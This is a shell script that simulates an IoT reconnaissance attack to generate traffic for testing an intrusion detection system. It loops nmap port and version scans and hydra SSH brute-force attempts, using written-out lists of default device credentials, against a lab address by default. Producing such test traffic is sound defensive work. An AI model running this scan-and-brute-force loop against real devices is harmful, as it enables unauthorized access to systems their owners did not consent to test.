#!/bin/sh
# IoT Reconnaissance & Access simulation — port/service scanning plus light
# credential-access attempts against a home device, for IDS (TON-IoT) evaluation.
echo "[IOT-RECON] Starting..."
TARGET="${TARGET_HOST:-172.20.0.10}"
INTENSITY="${INTENSITY:-medium}"
DURATION="${DURATION:-60}"
END=$(($(date +%s) + DURATION))

# Intensity -> nmap timing template, port breadth, access attempts, pause
case "$INTENSITY" in
    low)    TIMING=2; PORTS="1-1024";  THREADS=2; SLEEP_MAX=6 ;;
    high)   TIMING=4; PORTS="1-65535"; THREADS=8; SLEEP_MAX=2 ;;
    *)      TIMING=3; PORTS="1-10000"; THREADS=4; SLEEP_MAX=4 ;;  # medium
esac

# Small credential lists for the light access-attempt phase
cat > /tmp/iot_users.txt << 'EOF'
admin
root
user
pi
device
EOF
cat > /tmp/iot_passwords.txt << 'EOF'
admin
password
1234
root
raspberry
toor
EOF

while [ $(date +%s) -lt $END ]; do
    # Service/version discovery
    nmap -sS -sV -p "$PORTS" -T$TIMING "$TARGET" 2>/dev/null
    # Light credential-access attempt over common IoT services
    hydra -L /tmp/iot_users.txt -P /tmp/iot_passwords.txt \
        -t $THREADS -q "$TARGET" ssh 2>/dev/null
    sleep $((RANDOM % SLEEP_MAX + 1))
done
echo "[IOT-RECON] Done."
